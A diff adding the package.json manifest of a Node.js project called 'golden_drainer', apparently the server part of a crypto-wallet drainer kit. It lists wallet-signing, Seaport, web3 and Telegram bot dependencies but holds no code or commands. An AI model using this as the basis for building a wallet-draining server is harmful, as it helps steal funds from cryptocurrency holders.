@@ -1,0 +1,25 @@
+{
+  "name": "golden_drainer",
+  "version": "1.0.0",
+  "description": "Golden Drainer Server",
+  "main": "server.js",
+  "author": "GoldenDrainerSupport",
+  "license": "ISC",
+  "dependencies": {
+    "@metamask/eth-sig-util": "^5.0.2",
+    "@opensea/seaport-js": "^1.2.0",
+    "async": "^3.2.4",
+    "axios": "^1.1.3",
+    "body-parser": "^1.20.2",
+    "cors": "^2.8.5",
+    "ethers": "^5.7.2",
+    "express": "^4.18.2",
+    "express-body-parser-error-handler": "^1.0.4",
+    "express-useragent": "^1.0.15",
+    "keccak256": "^1.0.6",
+    "merkletreejs": "^0.3.9",
+    "node-telegram-bot-api": "^0.61.0",
+    "qs": "^6.11.0",
+    "web3": "^3.0.0-rc.5"
+  }
+}
